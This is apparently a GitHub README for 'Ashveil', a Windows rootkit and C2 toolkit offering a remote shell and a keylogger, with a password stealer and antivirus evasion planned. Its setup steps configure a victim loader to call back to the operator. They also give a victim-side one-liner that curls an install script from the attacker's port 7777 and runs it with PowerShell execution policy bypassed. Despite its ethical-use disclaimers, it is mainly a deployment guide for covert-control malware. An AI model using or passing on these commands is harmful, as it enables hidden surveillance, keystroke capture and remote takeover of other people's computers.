# **Ashveil - README**

## Overview

**Ashveil** is a powerful Windows-based tool designed to demonstrate advanced cybersecurity techniques, including **DLL injection**, **memory-based code execution**, and **C2 (Command and Control) server communication**. This tool provides a deep dive into **rootkit installation** and **stealth operations**, showcasing how attackers can gain remote control over compromised machines while evading common detection methods.

**Important Warning**: Ashveil is a highly dangerous tool that can be used to compromise and control systems. It is strictly intended for **educational purposes** within controlled environments, such as penetration testing, ethical hacking, or malware research. **Unauthorized use is illegal** and carries significant legal risks.

> **Disclaimer**: The creator is not responsible for any damage, harm, or illegal activity caused by the use or misuse of this tool. The tool should only be used in environments where the user has **explicit permission**.

## Features

- **Rootkit Installation**: Conceals malicious processes and files to evade detection from system monitoring tools (e.g., Task Manager and Windows Explorer).
- **DLL Injection**: Injects code into a target process to install a backdoor, bypassing traditional antivirus defenses.
- **Memory-based Execution**: Executes code directly in system memory, leaving no trace on disk and avoiding signature-based detection.
- **C2 Communication**: Allows the attacker to remotely control the compromised system via a C2 server. Payloads and actions can be modified in real-time.
- **Web Dashboard**: A user-friendly web interface to manage and monitor all connected clients, facilitating payload control and monitoring of infected systems.

## Upcoming Features

- **AES Encryption**: Payloads will be encrypted for secure communication over the network.
- **New Payloads**: Additional payloads will be developed, including a password stealer and a live viewer (real-time screen capture).
- **More Payload Options**: Future updates will include the ability to create custom payloads in shellcode.
- **Obfuscation Techniques**: Enhanced methods to avoid detection by antivirus software and other security tools.
- **Self-Maintenance**: Adding watchdogs and automatic updates for better tool functionality and longevity.

## Current Payloads

- **SHELL**: A remote shell that allows the attacker to execute commands on the victim machine. If the victim is running the rootkit, elevated permissions can be granted.
- **Keylogger**: Captures and logs all keystrokes typed by the user, sending the log back to the C2 server.

## Installation

### Prerequisites

- **Operating System**: Windows (tested on Windows 10)
- **Dependencies**: Install required Python libraries by running:
    ```bash
    pip install -r requirements.txt
    ```

### Setup

1. **Clone the Repository**:
    ```bash
    git clone --recurse-submodules https://github.com/madmaxvoltro/Ashveil.git
    cd Ashveil
    ```

2. **Install Dependencies**:
    ```bash
    pip install -r requirements.txt
    ```

3. **Configure the Victim Executable**:
   Set the victim executable to connect back to your server’s IP address.
   ```bash
   loader/InMemLoader.exe -SetIp <your ip>

4. **Running the Tool:**
   **Start the Server:** The server controls the attacker's environment and client connections.
   ```bash
   python server/server.py
   ```

5. **start the Attacker:** This will execute the payload on the victim machine.
   ```bash
   python attacker/attacker.py
   ```
6. **install on the victim pc:** this will be the installer command for victim
   ```powershell
   curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -o install.ps1 http://<ip>:7777/install && powershell -ExecutionPolicy Bypass -File .\install.ps1
   ```
## Configuration
### Modifying the Payload 
The payload and its behavior can be easily modified in the ``server/payloads/`` directory. You can create new payloads or modify existing ones by following these steps:
1. Open the ``server/payloads/`` directory.
2. Create a new C# file with your payload code or edit an existing one.
3. Restart the server to load the new or modified payload.
> **Note:** Payloads must be written in C# for compatibility with the tool.

### Customizing the C2 Server
You can adjust the behavior of the C2 server, including changing the communication port. For example, to change the server's port:
```python
# Example: Set custom port for the C2 server
port = 7777  # Change this to your desired port
```     
### important Safety & Legal Warnings
**Ashveil** is a **highly dangerous tool** capable of causing significant damage if used irresponsibly. It is classified as a **cyber weapon** due to its potential for malicious misuse.**

### Use Only in Ethical and Legal Environments
- **Ethical Use: Ashveil** should be used only in controlled environments, such as penetration testing labs, where you have **explicit consent** from the system owner.
- **Unauthorized Use:** Using this tool on systems without permission is **illegal** and punishable by law. The creator will not be held liable for any illegal actions or damage caused by this tool.

### License
This project is licensed under the MIT License – see the [LICENSE](https://github.com/madmaxvoltro/Ashveil/blob/main/LICENSE) file for details.

However, please note that this tool is only intended for educational and ethical research purposes. It should not be used for illegal activities. Misuse could result in legal consequences.

### Ethics & Responsible Use
**Ashveil** was created to provide educational insights into malware techniques and cybersecurity research. It is meant for **ethical hacking**, **red teaming**, and **penetration testing**    only. Use this tool exclusively in environments where you have explicit permission and legal authorization.

Never use this tool on systems you do not own or have express permission to test. Always adhere to best practices for responsible disclosure and cybersecurity.

### Acknowledgments
- **Rootkit Code:** The rootkit used in this project is based on code from another open-source project. Credits go to the original author, byte77.

### Contact 
If you have any questions, feedback, or need assistance, feel free to contact me via issues